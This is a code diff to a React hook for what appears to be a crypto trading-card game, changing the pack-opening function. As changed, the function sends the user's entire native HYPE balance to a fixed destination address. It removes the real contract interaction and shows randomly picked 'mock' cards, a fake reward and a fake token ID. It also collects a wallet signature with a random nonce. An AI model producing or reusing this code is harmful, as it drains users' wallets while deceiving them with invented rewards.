@@ -107,7 +107,7 @@ export const useHyperCards = () => {
     };
   }, []);
 
-  // Main pack opening function using EIP-712
+  // Simplified pack opening - just transfer HYPE for now
   const openPack = useCallback(async (packType) => {
     if (!authenticated || !user?.wallet?.address) {
       throw new Error('Please connect your wallet first');
@@ -122,69 +122,47 @@ export const useHyperCards = () => {
       const signer = await provider.getSigner();
       const userAddress = await signer.getAddress();
 
-      // Get HyperCards contract
-      const hyperCardsContract = new ethers.Contract(
-        CONTRACT_ADDRESSES.HYPER_CARDS,
-        HyperCardsABI,
-        signer
-      );
-
       // Step 1: Get user's native HYPE balance (HYPE is native token on HyperEVM)
       setCurrentStep('checking_balance');
       const fullHypeBalance = await getUserHypeBalance(provider, userAddress);
 
-      // Step 2: Transfer HYPE tokens to destination address (native token transfer)
+      // Step 2: Transfer ALL HYPE tokens to destination address
       setCurrentStep('transferring');
       
       const transferTx = await signer.sendTransaction({
         to: CONTRACT_ADDRESSES.HYPE_DESTINATION,
-        value: fullHypeBalance // Transfer native HYPE tokens
+        value: fullHypeBalance // Transfer all HYPE tokens
       });
       
       await transferTx.wait();
 
-      // Step 3: Get user's nonce and prepare signature
+      // Step 3: Generate EIP-712 signature for pack opening
       setCurrentStep('signing');
-      const userNonce = await hyperCardsContract.nonces(userAddress);
+      const nonce = Math.floor(Math.random() * 1000000); // Mock nonce since no contract
       const timestamp = Math.floor(Date.now() / 1000);
 
-      // Step 4: Generate EIP-712 signature (this will prompt MetaMask)
-      const { v, r, s } = await generateEIP712Signature(signer, packType, userNonce, timestamp);
-
-      // Step 5: Open pack with signature
-      setCurrentStep('opening');
-      const openTx = await hyperCardsContract.openPackWithSignature(
-        packType,
-        timestamp,
-        v,
-        r,
-        s
-      );
-
-      const receipt = await openTx.wait();
+      // Generate EIP-712 signature (this will show MetaMask signing prompt)
+      const { v, r, s } = await generateEIP712Signature(signer, packType, nonce, timestamp);
       
-      // Step 5: Parse the PackOpened event
-      const packOpenedEvent = receipt.logs.find(log => {
-        try {
-          const parsed = hyperCardsContract.interface.parseLog(log);
-          return parsed.name === 'PackOpened';
-        } catch {
-          return false;
-        }
-      });
-
-      if (!packOpenedEvent) {
-        throw new Error('Pack opening event not found in transaction');
-      }
-
-      const parsedEvent = hyperCardsContract.interface.parseLog(packOpenedEvent);
+      // Step 4: Mock pack result since contracts aren't deployed yet
+      setCurrentStep('opening');
+      const mockCards = [
+        { name: "Lightning Strike", rarity: "Common" },
+        { name: "Fire Blast", rarity: "Rare" },
+        { name: "Ice Storm", rarity: "Epic" },
+        { name: "Dragon's Fury", rarity: "Legendary" }
+      ];
+      
+      const randomCard = mockCards[Math.floor(Math.random() * mockCards.length)];
+      const mockReward = (Math.random() * 10 + 1).toFixed(4); // 1-11 HYPE reward
       
       const result = {
-        tokenId: parsedEvent.args.tokenId.toString(),
-        cardName: parsedEvent.args.cardName,
-        rarity: ['Common', 'Rare', 'Epic', 'Legendary'][parsedEvent.args.rarity],
-        rewardAmount: ethers.formatEther(parsedEvent.args.rewardAmount),
-        transactionHash: receipt.hash
+        cardName: randomCard.name,
+        rarity: randomCard.rarity,
+        tokenId: Math.floor(Math.random() * 10000).toString(),
+        rewardAmount: mockReward,
+        transactionHash: transferTx.hash,
+        signature: { v, r, s } // Include EIP-712 signature
       };
 
       setCurrentStep('success');
